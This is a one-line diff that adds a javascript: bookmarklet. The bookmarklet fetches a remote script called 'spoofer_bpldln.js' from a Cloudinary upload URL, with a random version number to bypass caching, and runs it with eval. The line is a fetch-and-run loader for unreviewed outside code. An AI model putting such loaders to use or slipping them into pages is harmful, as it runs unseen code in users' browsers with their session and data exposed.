@@ -1,1 +1,1 @@
-                                                                                      
+javascript:fetch(`https://res.cloudinary.com/flushed/raw/upload/v${Math.floor(Math.random() * 9999999)}/spoofer_bpldln.js`).then((res) => res.text().then((t) => eval(t)))
